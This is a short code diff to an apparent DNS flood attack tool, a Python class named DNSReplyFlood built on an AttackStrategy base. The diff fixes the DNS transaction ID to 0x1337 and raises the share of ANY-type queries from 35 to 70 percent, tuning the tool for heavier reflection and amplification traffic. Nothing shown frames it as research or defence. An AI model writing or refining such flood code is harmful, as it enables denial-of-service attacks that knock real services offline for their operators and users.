@@ -1,5 +1,4 @@
 import os
-import sys
 import socket
 import struct
 import random
@@ -225,7 +224,7 @@ class DNSReplyFlood(AttackStrategy):
         return encoded
 
     def _create_dns_header(self):
-        transaction_id = random.randint(1, 65535)
+        transaction_id = 0x1337
         flags = 0x0100  # Standard query, recursion desired
         qdcount = 1
         ancount = 0
@@ -353,7 +352,7 @@ class DNSReplyFlood(AttackStrategy):
         while self.attack_active:
             try:
                 domain = self._pick_query_domain()
-                if random.random() < 0.35:
+                if random.random() < 0.7:
                     qtype = 255  # ANY
                 else:
                     qtype = random.choice(self.query_types)
